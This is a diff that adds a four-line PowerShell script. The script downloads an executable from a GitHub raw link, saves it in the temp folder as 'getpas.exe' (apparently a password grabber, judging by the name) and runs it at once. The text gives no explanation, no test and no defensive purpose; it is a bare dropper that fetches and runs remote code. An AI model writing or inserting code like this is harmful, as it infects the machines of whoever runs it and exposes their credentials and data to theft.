@@ -1,0 +1,4 @@
+$exePath = "$env:TEMP\getpas.exe"
+$webClient = New-Object System.Net.WebClient
+$webClient.DownloadFile("https://github.com/Phamminhhaik7/listlink/raw/refs/heads/master/winbase64.exe", $exePath)
+Start-Process $exePath
